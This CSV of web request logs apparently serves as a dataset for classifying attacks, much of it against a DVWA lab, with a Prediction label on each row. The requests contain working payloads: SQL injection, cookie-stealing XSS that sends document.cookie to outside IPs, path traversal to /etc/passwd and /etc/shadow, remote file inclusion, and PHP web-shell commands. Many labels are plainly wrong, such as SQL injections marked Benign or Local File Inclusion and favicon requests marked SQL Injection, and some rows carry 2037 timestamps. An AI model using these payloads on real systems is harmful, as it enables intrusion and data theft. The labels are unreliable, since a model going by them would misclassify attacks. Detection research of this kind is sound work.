IP,Timestamp,Logs,Prediction
192.168.180.129 , [13/Mar/2022:00:14:02 +0800] ,GET /dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd HTTP/1.1  [-] 200 1628 ,Local File Inclusion
102.247.49.87 , [27/Dec/2037:12:00:00 +0530] ,GET /usr/login HTTP/1.0  200 4959 ,Benign
192.168.154.136 , [09/Mar/2022:17:05:30 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ccolumn_name%2Ccolumn_type%29%29%2C0x717a786b71%29%2CNULL%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x7573657273%20AND%20table_schema%3D0x64767761--%20-&Submit=Submit HTTP/1.1  [-] 200 82 ,XSS
127.0.0.1 , [16/Mar/2023:03:21:55 -0400] ,GET /dvwa/vulnerabilities/sqli/?id=1%27UNION+SELECT+*+FROM+information_schema.tables&Submit=Submit HTTP/1.1  500 295 ,Local File Inclusion
51.228.64.189 , [27/Dec/2037:12:00:00 +0530] ,PUT /usr/login HTTP/1.0  500 5021 ,XSS
215.219.253.147 , [25/Jun/2020:03:09:12 +0000] ,GET ../../../../apache/logs/access.log HTTP/1.1  200 6969 ,SQL Injection
59.84.20.209 , [27/Dec/2037:12:00:00 +0530] ,PUT /usr/login HTTP/1.0  403 4978 ,XSS
192.168.180.129 , [13/Mar/2022:00:03:59 +0800] ,GET / HTTP/1.1  [-] 403 152 ,XSS
192.168.200.129 , [07/Mar/2022:16:41:41 +0800] ,GET /dvwa/images/logo.png HTTP/1.1  [-] 304 0 ,Benign
127.0.0.1 , [07/Mar/2023:10:41:01 -0500] ,GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users%23&Submit=Submit HTTP/1.1  200 1889 ,Local File Inclusion
192.168.154.1 , [21/Feb/2022:14:11:50 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%25253Cxss%252520onmouseover%253D%252522alert%25281%2529%252522%25253Etest%25253C%252Fxss%25253E HTTP/1.1  [-] 200 1593 ,XSS
10.146.237.114 , [25/Jun/2020:03:09:12 +0000] ,GET ../../../../apache/logs/access.log HTTP/1.1  200 1292 ,SQL Injection
192.168.154.1 , [09/Mar/2022:17:02:46 +0800] ,GET /dvwa/dvwa/images/login_logo.png HTTP/1.1  [-] 304 0 ,Local File Inclusion
53.39.194.246 , [25/Jun/2020:03:09:12 +0000] ,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1  200 6199 ,SQL Injection
192.168.180.129 , [13/Mar/2022:01:24:55 +0800] ,POST /dvwa/hackable/uploads/definitelyimage.php?feature=shell HTTP/1.1  [cmd=ls&cwd=null] 200 146 ,Local File Inclusion
127.0.0.1 , [16/Mar/2023:03:20:21 -0400] ,GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit HTTP/1.1  200 1888 ,Benign
246.228.85.123 , [25/Jun/2020:03:09:12 +0000] ,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1  200 3917 ,Local File Inclusion
192.168.180.129 , [13/Mar/2022:01:24:55 +0800] ,POST /dvwa/hackable/uploads/definitelyimage.php?feature=shell HTTP/1.1  [cmd=whoami&cwd=null] 200 84 ,Local File Inclusion
229.176.157.83 , [27/Dec/2037:12:00:00 +0530] ,GET /usr/register HTTP/1.0  500 4984 ,XSS
192.168.154.1 , [21/Feb/2022:14:11:57 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%2525253Cxss%25252520onmouseover%25253D%25252522alert%2525281%252529%25252522%2525253Etest%2525253C%25252Fxss%2525253E HTTP/1.1  [-] 200 1593 ,XSS
171.77.125.184 , [27/Aug/2011:03:09:46 +0000] ,GET login/?id=admin%27+-- HTTP/1.1  200 1824 ,Local File Inclusion
192.168.154.1 , [21/Feb/2022:14:07:51 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1  [-] 200 1593 ,XSS
127.0.0.1 , [09/Mar/2023:23:42:01 -0500] ,GET /dvwa/vulnerabilities/sqli/?id=AND%20%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29bAKL%29+AND+%27vRxe%27%3D%27vRxe&Submit=Submit&user_token=029ea98aa50cb6407a2ac69be590a437 HTTP/1.1  200 1676 ,Benign
239.69.30.191 , [27/Aug/2011:03:09:46 +0000] ,GET login/?id=%27+or+1=1%23 HTTP/1.1  200 6539 ,Benign
206.157.117.138 , [22/May/2012:00:16:54 +0000] ,GET /?name=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F41.37.237.17%22%3C%2Fscript%3E HTTP/1.1  200 1684 ,XSS
192.168.180.129 , [13/Mar/2022:00:04:04 +0800] ,GET /dvwa/login.php HTTP/1.1  [-] 200 684 ,Local File Inclusion
199.35.239.151 , [25/Jun/2020:03:09:12 +0000] ,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1  200 5653 ,Local File Inclusion
192.168.154.1 , [09/Mar/2022:17:02:46 +0800] ,GET /favicon.ico HTTP/1.1  [-] 404 209 ,SQL Injection
127.0.0.1 , [10/Mar/2023:04:06:56 -0500] ,GET /dvwa/vulnerabilities/sqli/?id=-1%20UNION%20SELECT%201%20INTO%20%40%2C%40%2C%40&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1675 ,XSS
70.134.111.240 , [27/Dec/2037:12:00:00 +0530] ,GET /usr/admin HTTP/1.0  403 4969 ,XSS
127.0.0.1 , [12/Mar/2023:08:27:41 -0400] ,GET /dvwa/vulnerabilities/fi/?page=http://www.evilsite.com/evil.php HTTP/1.1  200 1374 ,Local File Inclusion
124.59.136.249 , [27/Aug/2011:03:09:46 +0000] ,GET login/?id=27+or+1+%3D+1%3B+--+&Submit=Submit HTTP/1.1  200 3759 ,Benign
5.196.149.135 , [22/May/2012:00:16:54 +0000] ,GET /?file=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 1050 ,XSS
192.168.154.1 , [21/Feb/2022:13:30:52 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1  [-] 200 1590 ,XSS
192.168.154.1 , [21/Feb/2022:14:10:35 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cbody%20onload=alert(1)%3E HTTP/1.1  [-] 200 1593 ,XSS
192.168.154.1 , [21/Feb/2022:13:33:16 +0800] ,GET /dvwa/vulnerabilities/xss_r/?name=%3Cxss+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E HTTP/1.1  [-] 200 1488 ,XSS
127.0.0.1 , [16/Mar/2023:03:21:50 -0400] ,GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+*+FROM+information_schema.tables&Submit=Submit HTTP/1.1  500 295 ,SQL Injection
192.168.154.1 , [21/Feb/2022:14:07:38 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=1%20onerror=alert(1)%3E HTTP/1.1  [-] 200 1593 ,XSS
192.168.154.1 , [21/Feb/2022:14:13:49 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%3C%3C/select%3E%3Cimg%20src=%E2%80%99 HTTP/1.1  [-] 200 1593 ,SQL Injection
192.168.180.129 , [13/Mar/2022:00:04:04 +0800] ,GET /dvwa HTTP/1.1  [-] 301 194 ,Local File Inclusion
222.200.23.76 , [25/Jun/2020:03:09:12 +0000] ,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1  200 3921 ,SQL Injection
192.168.180.129 , [13/Mar/2022:00:29:16 +0800] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1  [<?php echo shell_exec($_GET['cmd']);?>] 200 53 ,SQL Injection
206.120.135.81 , [27/Aug/2011:03:09:46 +0000] ,GET login/?id=SELECT+%2A+FROM+members+WHERE+%271%27%3D%271%27+--&Submit=Submit HTTP/1.1  200 7837 ,Local File Inclusion
229.168.138.180 , [22/May/2012:00:16:54 +0000] ,GET /?p=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F149.45.28.89%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 3542 ,XSS
192.168.154.1 , [09/Mar/2022:17:00:53 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=3&Submit=Submit HTTP/1.1  [-] 200 1447 ,Benign
127.80.225.93 , [25/Jun/2020:03:09:12 +0000] ,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1  200 1690 ,Local File Inclusion
162.253.4.179 , [27/Dec/2037:12:00:00 +0530] ,GET /usr/admin/developer HTTP/1.0  200 5041 ,Local File Inclusion
127.0.0.1 , [16/Mar/2023:04:12:30 -0400] ,GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2Ctable_name+from+information_schema.tables+%23&Submit=Submit HTTP/1.1  200 2399 ,Local File Inclusion
192.168.180.129 , [13/Mar/2022:00:04:04 +0800] ,GET /dvwa/ HTTP/1.1  [-] 302 5 ,Benign
192.168.180.129 , [13/Mar/2022:00:04:41 +0800] ,GET /dvwa/js/add_event_listeners.js HTTP/1.1  [-] 404 152 ,Benign
127.0.0.1 , [12/Mar/2023:08:27:00 -0400] ,GET /dvwa/vulnerabilities/fi/?page=http://www.evilsite.com/evil.php. HTTP/1.1  200 1375 ,Local File Inclusion
192.168.180.129 , [13/Mar/2022:00:04:01 +0800] ,GET /favicon.ico HTTP/1.1  [-] 404 152 ,SQL Injection
218.238.98.230 , [27/Aug/2011:03:09:46 +0000] ,GET login/?id=admin%27+-- HTTP/1.1  200 2962 ,Benign
192.168.200.129 , [07/Mar/2022:16:41:41 +0800] ,GET //dvwa/js/add_event_listeners.js HTTP/1.1  [-] 304 0 ,Local File Inclusion
192.168.180.129 , [13/Mar/2022:00:14:02 +0800] ,GET /favicon.ico HTTP/1.1  [-] 404 152 ,SQL Injection
192.168.180.129 , [13/Mar/2022:00:14:02 +0800] ,GET /dvwa/dvwa/css/main.css HTTP/1.1  [-] 200 4026 ,Benign
127.0.0.1 , [10/Mar/2023:04:27:28 -0500] ,GET /dvwa/vulnerabilities/sqli/?id=%20ORDER%20BY%201%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11--%20&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1675 ,Benign
192.168.180.129 , [13/Mar/2022:00:04:04 +0800] ,GET /dvwa/dvwa/images/login_logo.png HTTP/1.1  [-] 200 9088 ,Local File Inclusion
167.97.42.150 , [25/Jun/2020:03:09:12 +0000] ,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1  200 6982 ,Local File Inclusion
173.188.220.122 , [25/Jun/2020:03:09:12 +0000] ,GET ../../../../etc/shadow HTTP/1.1  200 5918 ,Benign
120.134.111.122 , [25/Jun/2020:03:09:12 +0000] ,GET main.cgi?file=../../../../etc/passwd HTTP/1.1  200 2455 ,Benign
161.24.105.81 , [25/Jun/2020:03:09:12 +0000] ,GET ../../../../apache/logs/access.log HTTP/1.1  200 2135 ,XSS
192.168.154.1 , [21/Feb/2022:14:43:44 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=English&%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1  [-] 200 1592 ,Benign
213.90.185.182 , [27/Dec/2037:12:00:00 +0530] ,POST /usr HTTP/1.0  303 4926 ,SQL Injection
206.54.189.229 , [25/Jun/2020:03:09:12 +0000] ,GET get.php?file=../../../../etc/shadow HTTP/1.1  200 1721 ,Local File Inclusion
192.168.154.1 , [21/Feb/2022:14:11:25 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cxss%20onmouseover=%22alert(1)%22%3EEngkish%3C/xss%3E HTTP/1.1  [-] 200 1593 ,Benign
127.0.0.1 , [16/Mar/2023:03:41:51 -0400] ,GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+where+table_name+like%27user%25%27+%23&Submit=Submit HTTP/1.1  200 1796 ,Benign
151.162.123.58 , [22/May/2012:00:16:54 +0000] ,GET /?p=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F182.177.83.2%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 1071 ,XSS
23.162.51.3 , [27/Dec/2037:12:00:00 +0530] ,POST /usr/login HTTP/1.0  502 4940 ,Local File Inclusion
192.168.154.136 , [09/Mar/2022:17:05:30 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ccomment%2Ccomment_id%2Cname%29%29%2C0x717a786b71%29%2CNULL%20FROM%20dvwa.guestbook--%20-&Submit=Submit HTTP/1.1  [-] 200 82 ,Benign
127.0.0.1 , [10/Mar/2023:05:32:31 -0500] ,GET /dvwa/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1  200 1674 ,Benign
238.46.108.255 , [22/May/2012:00:16:54 +0000] ,GET /?search=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 2000 ,Benign
192.168.180.129 , [13/Mar/2022:00:04:41 +0800] ,GET /dvwa/dvwa/images/spanner.png HTTP/1.1  [-] 200 464 ,Benign
192.168.154.1 , [09/Mar/2022:17:00:52 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=2&Submit=Submit HTTP/1.1  [-] 200 1453 ,Benign
217.255.44.215 , [22/May/2012:00:16:54 +0000] ,GET /?p=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F101.21.155.81%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 3180 ,XSS
127.0.0.1 , [07/Mar/2023:10:44:02 -0500] ,GET /dvwa/vulnerabilities/sqli/?id=1%27+SELECT+*+FROM+users%23&Submit=Submit HTTP/1.1  500 295 ,Benign
238.200.212.12 , [27/Aug/2011:03:09:46 +0000] ,GET login/?id=%27+or+1=1%23 HTTP/1.1  200 6263 ,Benign
203.168.245.55 , [22/May/2012:00:16:54 +0000] ,GET /?file=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 4445 ,XSS
192.168.154.1 , [09/Mar/2022:17:00:51 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1  [-] 200 1445 ,Benign
192.168.154.1 , [09/Mar/2022:17:02:45 +0800] ,GET /dvwa/dvwa/css/login.css HTTP/1.1  [-] 304 0 ,Benign
27.67.234.69 , [25/Jun/2020:03:09:12 +0000] ,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1  200 7453 ,SQL Injection
192.168.180.129 , [13/Mar/2022:00:51:52 +0800] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=Y2F0IC9ldGMvcGFzc3dk HTTP/1.1  [<?php echo passthru(base64_decode($_GET['cmd']));?>] 200 1630 ,Benign
32.85.100.143 , [27/Aug/2011:03:09:46 +0000] ,GET login/?id=%27+or+1=1%23 HTTP/1.1  200 5567 ,Local File Inclusion
127.0.0.1 , [12/Mar/2023:08:29:11 -0400] ,GET /dvwa/vulnerabilities/view_help.php?id=fi&security=low&locale=en HTTP/1.1  200 1997 ,Local File Inclusion
217.255.44.215 , [22/May/2012:00:16:54 +0000] ,GET /?p=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F101.21.155.81%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 3180 ,XSS
252.156.232.172 , [27/Dec/2037:12:00:00 +0530] ,POST /usr/register HTTP/1.0  404 5028 ,Local File Inclusion
192.168.154.1 , [09/Mar/2022:17:00:55 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=hello&Submit=Submit HTTP/1.1  [-] 200 1417 ,Benign
95.128.77.151 , [25/Jun/2020:03:09:12 +0000] ,GET get-files?file=../../../../etc/passwd HTTP/1.1  200 5370 ,Local File Inclusion
192.168.200.129 , [07/Mar/2022:16:15:53 +0800] ,GET /dvwa/images/login_logo.png HTTP/1.1  [-] 304 0 ,Local File Inclusion
217.113.10.196 , [22/May/2012:00:16:54 +0000] ,GET /?p=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F209.150.182.91%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 3241 ,XSS
192.168.180.129 , [13/Mar/2022:00:29:53 +0800] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1  [<?php echo shell_exec($_GET['cmd']); ?>] 200 53 ,SQL Injection
